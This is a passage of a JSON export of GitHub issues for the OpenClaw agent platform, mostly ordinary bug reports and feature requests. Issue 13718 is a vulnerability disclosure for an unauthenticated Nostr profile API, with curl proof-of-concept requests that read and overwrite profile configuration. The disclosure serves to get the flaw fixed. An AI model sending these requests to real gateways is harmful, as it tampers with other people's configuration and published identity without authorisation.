next future occurrence — **silently advancing past-due jobs**\n- `runMissedJobs` only runs on startup\n- `onTimer` calls `findDueJobs` first, then `recomputeNextRuns` if nothing due — ordering looks correct\n- But `ensureLoaded` with `forceReload` during store reload may trigger `recomputeNextRuns` before `findDueJobs` in edge cases\n\n## Possibly related\n\n- #10788 (closed, supposedly fixed by #11641)\n- #10025 (48h gap)\n- #9788 (recomputeNextRuns bug)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13739",
      "createdAt": "2026-02-10T23:47:57Z",
      "updatedAt": "2026-02-10T23:47:57Z",
      "author": "wanda-ai",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "slack"
        ],
        "platforms": [
          "macos"
        ],
        "components": [
          "gateway",
          "config"
        ]
      }
    },
    {
      "number": 13736,
      "title": "[Feature]: Support per-agent compaction settings (mode, reserveTokensFloor, memoryFlush) in agents.list[]",
      "body": "## Summary\nCurrently, compaction settings in OpenClaw (such as compaction mode, reserveTokensFloor, and memoryFlush configuration) are only configurable in `agents.defaults.compaction`. There is no way to override compaction settings for individual agents listed in `agents.list[]`, unlike other features such as heartbeat, sandbox, and tools which support per-agent overrides.\n\nThis limits flexibility. Some use cases might require different context window management strategies for different agents (e.g. long-running research agents vs. quick-turnaround chat agents).\n\n## Proposed solution\nAllow compaction settings (mode, reserveTokensFloor, memoryFlush, etc) to be optionally specified per-agent in `agents.list[]`, following the pattern used for heartbeat and tools overrides. When a compaction config is present for an agent, it would override the defaults for that agent only.\n\n## Additional context\n- Example of per-agent configuration: `agents.list[].heartbeat` in the OpenClaw configuration.\n- Type definitions to review/add: [src/config/types.agents.ts](src/config/types.agents.ts), [src/config/types.agent-defaults.ts](src/config/types.agent-defaults.ts).\n- Relevant schemas: `src/config/zod-schema.agent-runtime.ts`.\n- For reference, compaction config currently lives only in `agents.defaults.compaction`.",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13736",
      "createdAt": "2026-02-10T23:35:24Z",
      "updatedAt": "2026-02-10T23:35:24Z",
      "author": "TeemuSailynoja",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "config"
        ]
      }
    },
    {
      "number": 13735,
      "title": "isLikelyContextOverflowError regex misclassifies rate limit errors as context overflow",
      "body": "## Bug Description\n\nWhen Anthropic returns an HTTP 429 TPD (Tokens Per Day) rate limit error, OpenClaw incorrectly displays it as:\n\n> ⚠️ Context overflow — prompt too large for this model. Try a shorter message or a larger-context model.\n\nThis is misleading because the actual issue is rate limiting, not context overflow.\n\n## Root Cause\n\nThe regex in `isLikelyContextOverflowError()` is too broad:\n\n```js\n/(?:prompt|request).*(too (?:large|long)|exceed|over|limit|max(?:imum)?)/i\n```\n\nThe Anthropic 429 error message:\n```\nrequest reached organization TPD rate limit, current: 1506556, limit: 1500000\n```\n\nThis matches `request` + `limit` in the regex, causing it to be classified as a context overflow error.\n\n## Expected Behavior\n\nRate limit errors (HTTP 429) should be displayed as rate limit / quota errors, not as context overflow.\n\n## Steps to Reproduce\n\n1. Exceed the Anthropic TPD token limit (1.5M tokens/day)\n2. Send a message via Discord channel\n3. All fallback models fail with 429\n4. OpenClaw shows \"Context overflow\" instead of a rate limit error\n\n## Environment\n\n- OpenClaw version: 2026.2.9\n- Model: anthropic/claude-opus-4-6\n- Channel: Discord\n\n## Suggested Fix\n\nEither:\n1. Add a negative lookahead/check to exclude rate limit errors before testing context overflow regex\n2. Check for rate limit errors first (higher priority) before falling through to context overflow classification\n3. Tighten the regex to require context-specific terms (e.g. require \"context\" or \"token\" near \"limit\")",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13735",
      "createdAt": "2026-02-10T23:33:04Z",
      "updatedAt": "2026-02-10T23:33:04Z",
      "author": "Lunar-actuary",
      "labels": [],
      "taxonomy": {
        "channels": [
          "discord"
        ],
        "platforms": [],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 9737,
      "title": "WhatsApp: Periodic 408 disconnects (status timeout)",
      "body": "## Environment\n- OS: Windows 10\n- OpenClaw: 2026.2.3-1\n- WhatsApp channel: enabled, linked\n\n## Issue\nWhatsApp gateway periodically disconnects with status 408 (timeout), then reconnects automatically after a few seconds.\n\n## Symptoms\nFrom gateway logs:\n- WhatsApp gateway disconnected (status 408)\n- WhatsApp gateway connected (few seconds later)\n\nThis happens multiple times per hour during normal operation.\n\n## Impact\n- Minor: Messages may be delayed during disconnect window\n- Auto-reconnect works, so not critical\n- But frequent disconnects suggest underlying issue\n\n## Questions\n1. Is 408 timeout expected behavior or a bug?\n2. Is there a keepalive/heartbeat setting to prevent timeouts?\n3. Should the reconnect be more graceful?\n\n## Workaround\nNone needed - auto-reconnect works. But would be nice to prevent the disconnects.",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/9737",
      "createdAt": "2026-02-05T16:30:20Z",
      "updatedAt": "2026-02-10T23:28:06Z",
      "author": "henrybottter",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [
          "windows"
        ],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3872603468,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9737#issuecomment-3872603468",
          "createdAt": "2026-02-09T15:59:46Z",
          "updatedAt": "2026-02-09T15:59:46Z",
          "author": "dermoeck",
          "body": "same here, nearly not useable. sometimes longer time witout issues, then suddenly it stops working and starts again \"somewhen\".. telegtram is much more stabel\n"
        },
        {
          "id": 3881269869,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/9737#issuecomment-3881269869",
          "createdAt": "2026-02-10T23:28:06Z",
          "updatedAt": "2026-02-10T23:28:06Z",
          "author": "syphax",
          "body": "Same issue here.\nOpenClaw v 2026.2.6-3\nMac 14.6.1"
        }
      ]
    },
    {
      "number": 13734,
      "title": "[Feature]: Let's make our Telegram Bots feel ALIVE! (Live Thinking Timer)",
      "body": "Hi everyone! 👋\n\nI've been using OpenClaw with Telegram, and it's awesome. But I have a killer idea to make the User Experience 10x better.\n\nThe Problem:\nRight now, when an agent is doing some heavy lifting (parsing files, running tools, or just thinking hard), the chat goes completely silent. Sometimes for 10-30 seconds.\nI find myself staring at the screen wondering: \"Did it crash? Is my server down? Did it forget about me?\" 😅\nIt kills the flow and feels a bit... robotic.\n\nThe Dream Feature:\nImagine if the bot could show a Live Status Timer in real-time! Just like a modern CLI tool or a sci-fi terminal.\n\nInstead of silence, you'd see a message updating every second:\n\n⏳ Thinking... (2s)\nupdates to...\n🛠️ Running tool: grep... (5s)\nupdates to...\n✍️ Typing... (8s)\n\nAnd then BAM! The final answer appears.\n\nWhy we need this:\n\n1. Peace of mind: Users instantly know the bot is working. No more guessing.\n2. Transparency: Seeing what it's doing (e.g., \"Running Tool\") is super helpful.\n3. It just looks COOL. It makes the agent feel alive and responsive.\nTechnical Concept (Simplified for Telegram Bot):\n\nThis could be implemented by sending a placeholder message and using editMessageText every ~1.5s (to respect Telegram API limits) with an updated timer string, running in a background loop while the main agent process does its magic.\n\n```\n// Core loop logic for Telegram Bot (concept)\n\nasync function handleUserRequest(ctx) {\n  // 1. Send initial placeholder\n  let statusMsg = await ctx.reply(\"⏳ Starting... (0s)\");\n  let startTime = Date.now();\n  \n  // 2. Background ticker (1.5s interval to respect API limits)\n  let ticker = setInterval(async () => {\n     let seconds = Math.floor((Date.now() - startTime) / 1000);\n     let status = agent.getCurrentStatus(); // e.g. \"Thinking\", \"Exec\", etc.\n     \n     try {\n       await ctx.telegram.editMessageText(\n         ctx.chat.id, \n         statusMsg.message_id, \n         undefined, \n         `⏳ ${status}... (${seconds}s)`\n       );\n     } catch (e) {\n       // Ignore \"message not modified\" errors\n     }\n  }, 1500);\n\n  try {\n     // 3. Main execution\n     let result = await agent.run(ctx.message.text);\n     \n     // 4. Cleanup & Final Response\n     clearInterval(ticker);\n     await ctx.telegram.editMessageText(\n        ctx.chat.id, \n        statusMsg.message_id, \n        undefined, \n        result.text\n     ); \n  } catch (err) {\n     clearInterval(ticker);\n     await ctx.telegram.editMessageText(\n        ctx.chat.id, \n        statusMsg.message_id, \n        undefined, \n        `❌ Error after ${Math.floor((Date.now() - startTime) / 1000)}s: ${err.message}`\n     );\n  }\n}\n```\n\nTo the Community & Devs:\nIf you also want your bots to feel more responsive and less like a black box, please give this a Thumbs Up 👍 or a comment! Let's make OpenClaw the best agent platform out there! 🚀\n\nThanks for listening!",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13734",
      "createdAt": "2026-02-10T23:27:11Z",
      "updatedAt": "2026-02-10T23:27:11Z",
      "author": "daniel5221f19f-arch",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 13732,
      "title": "Feature: Post-response hook for token usage tracking",
      "body": "## Summary\nAdd a hook/event that fires after the LLM response is complete, exposing token usage data for external tracking and analytics.\n\n## Use Case\nCurrently there's no easy way to capture token consumption (input/output tokens, cost) after each response. Users want to:\n- Log token usage to external systems (databases, analytics platforms)\n- Track costs per conversation/user/channel\n- Build dashboards and alerts for usage monitoring\n\n**This is especially critical for multi-agent architectures**, where:\n- Multiple sub-agents spawn dynamically and consume tokens independently\n- Parent orchestrators need visibility into total cost across agent trees\n- Cost attribution per task/agent becomes essential for optimization\n- Budget limits and alerts need to aggregate across all spawned sessions\n\n## Proposed Solution\nAdd a configurable post-response handler or event that receives:\n- `inputTokens` / `outputTokens`\n- `model` used\n- `sessionKey` / `channel` context\n- `parentSession` (for sub-agents)\n- `cost` (if available from provider)\n- `durationMs`\n\nThis could be:\n1. A webhook URL in config\n2. An event emitter that plugins can subscribe to\n3. A script/command to execute with the data as JSON\n\n## Example Config (strawman)\n```yaml\nhooks:\n  postResponse:\n    webhook: https://my-server.com/track-tokens\n    # or\n    exec: /path/to/script.sh\n```\n\n## Alternatives Considered\n- Parsing logs manually (fragile, not structured)\n- Modifying source code (not maintainable across updates)",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13732",
      "createdAt": "2026-02-10T23:21:06Z",
      "updatedAt": "2026-02-10T23:21:06Z",
      "author": "fjbotti",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux"
        ],
        "components": [
          "web-ui",
          "config"
        ]
      }
    },
    {
      "number": 10075,
      "title": "Telegram: Add support for receiving message reactions",
      "body": "## Feature Request\n\n**Current behavior:**\nThe Telegram channel can *send* reactions (ack reactions work great), but cannot *receive* reactions that users add to bot messages.\n\n**Expected behavior:**\nWhen a user reacts to a bot message with an emoji, the bot should receive a `message_reaction` update and be able to process it.\n\n**Context:**\n- Telegram Bot API 8.0 (Nov 2025) added support for bots to receive reaction updates\n- This is a common interaction pattern - users often react instead of typing replies\n- Currently missing ~75% of user feedback when they react instead of type\n\n**References:**\n- [Bot API 8.0 changelog](https://core.telegram.org/bots/api-changelog)\n- [Reactions API docs](https://core.telegram.org/api/reactions)\n- [grammY reactions guide](https://grammy.dev/guide/reactions)\n\n**Proposed solution:**\nListen for `message_reaction` and `message_reaction_count` update types and surface them to the agent context.",
      "state": "open",
      "comments": 1,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/10075",
      "createdAt": "2026-02-06T03:16:05Z",
      "updatedAt": "2026-02-10T23:16:49Z",
      "author": "Cosmo-DeBott",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "telegram"
        ],
        "platforms": [],
        "components": []
      },
      "commentsData": [
        {
          "id": 3881236800,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/10075#issuecomment-3881236800",
          "createdAt": "2026-02-10T23:16:49Z",
          "updatedAt": "2026-02-10T23:16:49Z",
          "author": "lucasverra",
          "body": "usefull "
        }
      ]
    },
    {
      "number": 13730,
      "title": "[Bug]: Cron session token counter stuck at context cap after session reset",
      "body": "## Summary\nWhat went wrong?  \nAfter deleting a cron session and letting the cron run again (new session), the Sessions view still reports `totalTokens` as the max/context cap (example: `272000 / 272000`) instead of reflecting the fresh session usage.  \nRun-level usage from `sessions_history` shows much lower real usage (example: ~23k), so the Sessions token counter appears stale/misleading.\n\n## Steps to reproduce\n1. Create a recurring cron job with `sessionTarget: isolated` and `payload.kind: agentTurn`.\n2. Let it run multiple times so context grows.\n3. Delete that cron session from Sessions.\n4. Wait for the next cron run (new session should be created automatically).\n5. Check `sessions_list` / Sessions UI token counter.\n6. Compare with latest run usage in `sessions_history` (`assistant.usage.totalTokens`).\n\n## Expected behavior\nWhat did you expect to happen?  \nAfter deletion and recreation, the new cron session should show token usage corresponding to the new session state (or clearly labeled metric). It should not instantly appear maxed at context cap.\n\n## Actual behavior\nWhat actually happened?  \nSessions still shows the cron session as `272000 / 272000` (or cap-equivalent) even though latest run usage is far lower (~23k). This makes token/cost tracking inaccurate from Sessions view.\n\n## Environment\n- Clawdbot version: OpenClaw 2026.2.9\n- OS: Linux arm64 (Raspberry Pi), kernel `6.12.62+rpt-rpi-v8`\n- Install method (pnpm/npx/docker/etc): npm\n\n\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13730",
      "createdAt": "2026-02-10T23:16:16Z",
      "updatedAt": "2026-02-10T23:16:16Z",
      "author": "mariusCatalin",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [],
        "platforms": [
          "linux",
          "docker"
        ],
        "components": [
          "websocket"
        ]
      }
    },
    {
      "number": 13728,
      "title": "Sub-agents hang on interactive CLI commands",
      "body": "## Description\nSub-agent sessions hang indefinitely when running interactive CLI tools like `npm install` (peer dependency conflicts) or `npx create-next-app` (ESLint prompts).\n\n### Example\nRunning a sub-agent with tasks like:\n- `npx create-next-app@14 . --typescript --tailwind --app`\n- `npm install wagmi viem @rainbow-me/rainbowkit`\n\nResults in the process hanging indefinitely, waiting for user input.\n\n### Root Cause\n1. Background/exec sessions lack a TTY\n2. npm/npx CLI tools prompt for confirmation on certain operations\n3. The `exec` tool does not forward stdin or handle interactive prompts\n4. Sub-agents cannot answer Yes/No questions\n\n### Expected Behavior\nEither:\n1. `exec` passes `--yes` / `--legacy-peer-deps` flags automatically for known commands\n2. `exec` has a `tty: true` option to enable interactive mode\n3. Sub-agents are warned/failed if a command is known to be interactive\n\n### Workaround Used\nManually ran commands with `yes | ...` and `npm install --legacy-peer-deps` to bypass prompts.\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13728",
      "createdAt": "2026-02-10T23:14:45Z",
      "updatedAt": "2026-02-10T23:14:45Z",
      "author": "abbas-claw",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": []
      }
    },
    {
      "number": 7200,
      "title": "Feature Request: Real-time Voice Conversation Support",
      "body": "# Summary\nAdd native support for real-time voice conversations (bidirectional streaming audio) to enable phone-like interactions via Twilio/WebRTC integration.\n\n## Motivation / Use Case\nCurrently, OpenClaw supports text messaging and voice messages (pre-recorded audio files). However, many users want to have fluid, real-time voice conversations with their AI assistant - similar to ChatGPT Voice or Gemini Live.\n\n**Specific use case:**\n- User self-hosts OpenClaw on a dedicated server with sufficient resources\n- User has set up local TTS (e.g., edge-tts with a high-quality custom voice)\n- User wants to call a Twilio number and have a natural, real-time voice conversation\n- Current limitation: Only pre-recorded voice messages are supported, not streaming\n\n## Proposed Solution\n\n### Option A: Twilio Media Streams Integration\nIntegrate with [Twilio Media Streams](https://www.twilio.com/docs/voice/twiml/stream) to handle bidirectional audio streaming:\n\n\nUser Phone <--> Twilio <--> WebSocket <--> OpenClaw\n                    ↓\n              Real-time pipeline:\n              1. Audio stream → STT (Whisper streaming)\n              2. LLM generates response\n              3. TTS generates audio (local edge-tts or similar)\n              4. Audio stream back to user\n\n\n**Technical requirements:**\n- WebSocket server for audio streaming\n- Real-time STT (OpenAI Whisper streaming or similar)\n- Streaming LLM responses\n- Fast TTS with caching (local edge-tts)\n- Interruption handling (user can speak over AI)\n\n### Option B: WebRTC Native Support\nAdd WebRTC support for browser-based voice calls without Twilio.\n\n### Option C: Voice \"Voicemail\" Mode (MVP)\nIntermediate solution:\n1. User calls Twilio number\n2. AI speaks first (pre-generated greeting)\n3. User records message\n4. Call ends\n5. AI processes, generates response\n6. AI calls user back with response\n\n## Current Setup Reference\n- Server: Self-hosted dedicated server (e.g., 64GB RAM, NVMe SSD)\n- TTS: edge-tts-as-a-service running locally\n- Voice: High-quality local TTS voice\n- Channel: WhatsApp (working)\n- Goal: Add Twilio voice with local TTS quality\n\n## Benefits\n1. **Accessibility**: Users can talk hands-free while driving, cooking, etc.\n2. **Natural interaction**: Voice is more natural than text for many use cases\n3. **Self-hosted**: Unlike ChatGPT Voice, data stays on user's server\n4. **Custom voices**: Use local TTS with personalized voices\n5. **Cost effective**: Self-hosted vs. paying for ChatGPT Plus ($20/month)\n6. **Language support**: Local TTS supports languages cloud providers don't cover well\n\n## Potential Challenges\n1. **Latency**: Need < 500ms total pipeline latency for natural feel\n2. **STT streaming**: Need real-time transcription, not batch\n3. **Interruptions**: Complex to handle user interrupting AI mid-sentence\n4. **Audio codecs**: Twilio uses specific formats (μ-law, Opus)\n5. **Resource usage**: Real-time streaming requires significant CPU/RAM\n\n## Alternatives Considered\n- **ChatGPT Voice**: Proprietary, cloud-based, no custom voices\n- **Gemini Live**: Same limitations\n- **Current voice messages**: Not real-time, requires manual recording/sending\n\n## Additional Context\nI have a working setup with edge-tts-as-a-service API running locally. The TTS quality is excellent. Now I need the \"glue\" to connect Twilio voice calls to this local TTS + LLM pipeline.\n\n## Related Issues\nNone found for real-time voice/streaming.\n",
      "state": "open",
      "comments": 2,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/7200",
      "createdAt": "2026-02-02T14:54:47Z",
      "updatedAt": "2026-02-10T23:12:38Z",
      "author": "miefriglapicioare-web",
      "labels": [
        "enhancement"
      ],
      "taxonomy": {
        "channels": [
          "whatsapp"
        ],
        "platforms": [],
        "components": [
          "gateway",
          "websocket"
        ]
      },
      "commentsData": [
        {
          "id": 3837451591,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7200#issuecomment-3837451591",
          "createdAt": "2026-02-02T21:10:50Z",
          "updatedAt": "2026-02-02T21:10:50Z",
          "author": "AkashaBot",
          "body": "This is a great request — and we’re actually pretty close today via the built-in voice-call plugin.\n\n### Option A (Twilio Media Streams) is already the direction\nOpenClaw’s voice-call plugin supports Twilio webhooks and a streaming endpoint (bidirectional audio over WebSocket), which maps directly to “Phone <-> Twilio <-> WebSocket <-> OpenClaw”.\n\nHigh-level flow:\n- Twilio call hits /voice/webhook (TwiML)\n- TwiML starts a <Stream> to /voice/stream\n- OpenClaw runs a realtime loop: STT → LLM → TTS → stream back, with interruption (barge‑in) handling\n\n### What’s still missing / what we can improve\n- Documentation: end-to-end Twilio setup + example TwiML + troubleshooting\n- UX: one-command “enable voice streaming” wizard + health checks\n- Optional: WebRTC as a separate browser-native mode (nice-to-have)\n\nIf you can share:\n- your target latency budget and codec preferences (μ-law vs Opus)\n- which STT you want to use (OpenAI Realtime, Whisper streaming, etc.)\n\n…we can turn this into a concrete doc page + small PR to make it easier to self-host."
        },
        {
          "id": 3881224267,
          "htmlUrl": "https://github.com/openclaw/openclaw/issues/7200#issuecomment-3881224267",
          "createdAt": "2026-02-10T23:12:38Z",
          "updatedAt": "2026-02-10T23:12:38Z",
          "author": "visigoth",
          "body": "i have been playing around with the voice-call plugin the past few days and finally got it to work. the hardest part was the networking as neither CloudFlare Tunnel nor tailscale funnel worked for me. the webhook worked fine, but twilio just wouldn't be able to connect to the audio stream endpoint. i finally just gave up and started an ngrok proxy instead and it worked out of the box. so, anyone coming here: save yourself the trouble of getting CF/TS to work. just use ngrok until CF/TS fix web socket transport.\n\nmy setup:\n- stt: openai (actually, unclear what model i'm using here as it's not part of the config afaict)\n- agent session: anthropic/claude-sonnet\n- tts: elevenlabs/eleven_flash_v2_5\n\ni found latency to be... okay, but a bit too transactional. in fact, i found voice messages in signal to feel less transactional than \"real time\" voice chat. that said, i think this could be usable enough where, if i'm on a walk and can only use a phone call, i could get *something* out of it. a note on latency: human factors research shows something like 400 milliseconds in round trip time makes a real-time conversation feel like you're using a walkie-talkie.\n\nnext, i found uLaw to be very low quality and now want to find real time voice chat methods instead (facetime audio would be ideal for me, but would probably mean generating speaker/microphone proxy devices and other weird hooks)."
        }
      ]
    },
    {
      "number": 13718,
      "title": "[Bug]: Unauthenticated Nostr profile API allows remote config tampering",
      "body": "## Summary\n\nThe Nostr extension exposes profile management HTTP endpoints that do not require gateway authentication. Any network-reachable attacker can read and mutate channel profile state, trigger signed profile publishes, and persist unauthorized profile changes into the gateway config.\n\n## Executive Risk Snapshot\n\n- CVSS v3.1: 8.6 (High)\n- CVSS v4.0: 8.8 (High)\n- Primary risk: The Nostr extension exposes profile management HTTP endpoints that do not require gateway authentication.\n\n## Technical Analysis\n\nGateway request dispatch executes plugin HTTP handlers before authenticated core API handlers, and this path does not enforce `authorizeGatewayConnect`. The Nostr plugin registers an HTTP handler that accepts `GET`, `PUT`, and `POST` profile-management requests without bearer token, password, or device-auth checks. The `PUT` path writes updated profile data into persisted OpenClaw config and triggers relay publish operations.\n\n## Affected Code\n\n**File:** `source_code/src/gateway/server-http.ts:334`\n```typescript\nif (await handleSlackHttpRequest(req, res)) {\n  return;\n}\nif (handlePluginRequest && (await handlePluginRequest(req, res))) {\n  return;\n}\nif (openResponsesEnabled) {\n  if (\n    await handleOpenResponsesHttpRequest(req, res, {\n      auth: resolvedAuth,\n```\n\n**File:** `source_code/extensions/nostr/src/nostr-profile-http.ts:322`\n```typescript\nif (req.method === \"GET\" && !isImport) {\n  return await handleGetProfile(accountId, ctx, res);\n}\nif (req.method === \"PUT\" && !isImport) {\n  return await handleUpdateProfile(accountId, ctx, req, res);\n}\nif (req.method === \"POST\" && isImport) {\n  return await handleImportProfile(accountId, ctx, req, res);\n}\n```\n\n**File:** `source_code/extensions/nostr/index.ts:44`\n```typescript\nawait runtime.config.writeConfigFile({\n  ...cfg,\n  channels: updatedChannels,\n});\n```\n\n## Steps to Reproduce\n\n1. Enable and load the `nostr` extension with a configured Nostr account, then start the gateway on a network-reachable interface.\n2. Send an unauthenticated request to read profile state:\n```bash\ncurl -i http://<gateway-host>:18789/api/channels/nostr/default/profile\n```\n3. Send an unauthenticated profile update request:\n```bash\ncurl -i -X PUT \\\n  -H 'Content-Type: application/json' \\\n  -d '{\"name\":\"attacker-controlled\",\"about\":\"pwned\"}' \\\n  http://<gateway-host>:18789/api/channels/nostr/default/profile\n```\n4. Observe HTTP success and persisted profile changes (and publish attempts) without any gateway auth material.\n\n## Recommended Fix\n\nEnforce gateway authentication/authorization for all plugin HTTP handlers by default in the core gateway request path. Keep plugin-specific checks as defense-in-depth, but do not allow unauthenticated plugin handler execution unless a route is explicitly marked public and reviewed.\n\n## Detailed Risk Analysis\n\n### CVSS Assessment\n\n| Metric | v3.1 | v4.0 |\n|--------|------|------|\n| **Score** | 8.6 / 10.0 | 8.8 / 10.0 |\n| **Severity** | High | High |\n| **Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N |\n| **Calculator** | [CVSS v3.1 Calculator](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L) | [CVSS v4.0 Calculator](https://www.first.org/cvss/calculator/4.0#CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:L/SC:N/SI:N/SA:N) |\n\n### Attack Surface\n- Exposed HTTP path family: `/api/channels/nostr/:accountId/profile` and `/api/channels/nostr/:accountId/profile/import`\n- Reachability: same listener as gateway HTTP server (`18789` by default)\n- Trust boundary crossed: unauthenticated network input to config-write and profile-publish operations\n\n### Exploit Conditions\n- Nostr plugin loaded and account configured.\n- Attacker can reach the gateway HTTP listener directly or through a reverse proxy.\n- No additional credentials, pairing state, or user interaction required.\n\n### Impact Assessment\n- Confidentiality: Low (profile state disclosure and operational metadata visibility).\n- Integrity: High (attacker-controlled profile mutation persisted to config and propagated to relays).\n- Availability: Low (attacker can repeatedly trigger profile operations and degrade channel behavior).\n\n## References\n\n- **CWE:** [CWE-306](https://cwe.mitre.org/data/definitions/306.html) - Missing Authentication for Critical Function\n- `source_code/src/gateway/server-http.ts:334`\n- `source_code/src/gateway/server/plugins-http.ts:45`\n- `source_code/extensions/nostr/index.ts:64`\n- `source_code/extensions/nostr/src/nostr-profile-http.ts:326`\n\n## Exploitability Proof\n\nSource to sink path:\n1. `createGatewayHttpServer` forwards HTTP requests to `handlePluginRequest` before authenticated OpenAI/tools handlers (`source_code/src/gateway/server-http.ts:334`).\n2. `createGatewayPluginRequestHandler` invokes plugin handlers directly without auth gating (`source_code/src/gateway/server/plugins-http.ts:45`).\n3. `nostr` plugin registers `createNostrProfileHttpHandler` on that unauthenticated path (`source_code/extensions/nostr/index.ts:64`).\n4. Handler accepts `PUT /api/channels/nostr/:accountId/profile` and executes `handleUpdateProfile` without credential checks (`source_code/extensions/nostr/src/nostr-profile-http.ts:326`).\n5. `handleUpdateProfile` calls `ctx.updateConfigProfile`, which writes updated profile data to config (`source_code/extensions/nostr/index.ts:44`), and triggers `publishNostrProfile` side effects (`source_code/extensions/nostr/src/nostr-profile-http.ts:437`).\n\n## Mitigation Checks Performed\n\n- Checked core gateway auth middleware/order: plugin handlers execute before authenticated OpenResponses/OpenAI handler branches.\n- Checked plugin HTTP router: no global token/password/device-auth enforcement.\n- Checked Nostr handler for local auth checks: no bearer token, password, signature, or origin validation.\n- Checked request throttling: only per-account request count exists; it does not provide authentication or authorization.\n\n## Reproduction Evidence\n\n- Request parser routes unauthenticated traffic directly based on URL path and method (`source_code/extensions/nostr/src/nostr-profile-http.ts:303-331`).\n- Update path persists attacker-provided profile content into config (`source_code/extensions/nostr/index.ts:31-47`).\n- No call to `authorizeGatewayConnect` in the Nostr handler chain.\n\n## Why This Is Exploitable (Not Hardening)\n\nThis is not a missing best-practice header or optional defense. It is a direct missing-auth control on a state-mutating network API path. A remote attacker can perform privileged profile-management actions and persist configuration changes without presenting any credential.\n\n<!-- submission-marker:AN-07-unauthenticated-nostr-profile-api -->\n",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13718",
      "createdAt": "2026-02-10T23:02:41Z",
      "updatedAt": "2026-02-10T23:02:41Z",
      "author": "coygeek",
      "labels": [],
      "taxonomy": {
        "channels": [],
        "platforms": [],
        "components": [
          "gateway",
          "web-ui",
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 13715,
      "title": "[Bug]: whatsapp formatting issue",
      "body": "Summary\nWhatsApp formatting is broken because Clawdbot sends standard Markdown (**bold**). WhatsApp requires its own markup (*bold*). Discord/Telegram render correctly.\n\nSteps to reproduce\n\t1.\tConfigure WhatsApp notifications.\n\t2.\tSend a message containing Markdown bold like **SOD Blast:**.\n\t3.\tView the message in WhatsApp.\n\nExpected behavior\nWhatsApp renders bold/italic/strike/mono correctly using WhatsApp formatting rules.\n\nActual behavior\nWhatsApp shows ** literally (example: **SOD Blast:**), so formatting is not applied.\n\nEnvironment\nAll versions, all OS. Reproducible consistently. Affects WhatsApp only.\n\nProposed fix\nAdd a separate WhatsApp renderer/formatter and route WhatsApp notifications through it.\nShort term acceptable fix: WhatsApp-only conversion of **text** → *text*.\n\nMinimum requirements\n\t•\tConvert **text** → *text*\n\t•\tConvert Markdown italic *text* → WhatsApp italic _text_ (to avoid conflicts with bold)\n\t•\tPreserve code blocks with triple backticks\n\t•\tEscape edge cases so literal asterisks/underscores don’t break formatting",
      "state": "open",
      "comments": 0,
      "htmlUrl": "https://github.com/openclaw/openclaw/issues/13715",
      "createdAt": "2026-02-10T22:57:43Z",
      "updatedAt": "2026-02-10T22:57:43Z",
      "author": "nikhil8182",
      "labels": [
        "bug"
      ],
      "taxonomy": {
        "channels": [
          "telegram",
          "whatsapp",
          "discord"
        ],
        "platforms": [],
        "components": [
          "config",
          "websocket"
        ]
      }
    },
    {
      "number": 9527,
      "title": "Bug: before_compaction / after_compaction plugin hooks are never called",
      "body": "## Bug: `before_compaction` / `after_compaction` plugin hooks are never called\n\n### Description\n\nThe `before_compaction` and `after_compaction` hooks are defined in the plugin API and documented in the agent-loop docs, but they are never actually invoked during compaction.\n\n### Steps to Reproduce\n\n1. Create a plugin that registers a `before_compaction` hook:\n```typescript\napi.on(\"before_compaction\", async (event) => {\n  api.logger.info(\"before_compaction fired!\");\n  console.log(\"Messages:\", event.messages?.length);\n});\n```\n\n2. Trigger compaction (fill context window or use `/compact`)\n\n3. Observe that the hook never fires\n\n### Expected Behavior\n\nThe `before_compaction` hook should fire before compaction summarizes messages, passing the messages that are about to be compacted in the event payload.\n\n### Actual Behavior\n\nThe hook is never called. Searching the dist files shows `runBeforeCompaction` and `runAfterCompaction` are defined and exported, but never invoked in the compaction code path.\n\n### Evidence\n\n```bash\n# Functions are defined/exported\ngrep -rn \"runBeforeCompaction\" dist/ | grep -v \"function\\|async\"\n# Returns only export lines, no invocations\n\n# Hooks are documented as working\n# docs/concepts/agent-loop.md says:\n# \"before_compaction / after_compaction: observe or annotate compaction cycles.\"\n```\n\n### Use Case\n\nMemory plugins need this hook to capture conversation 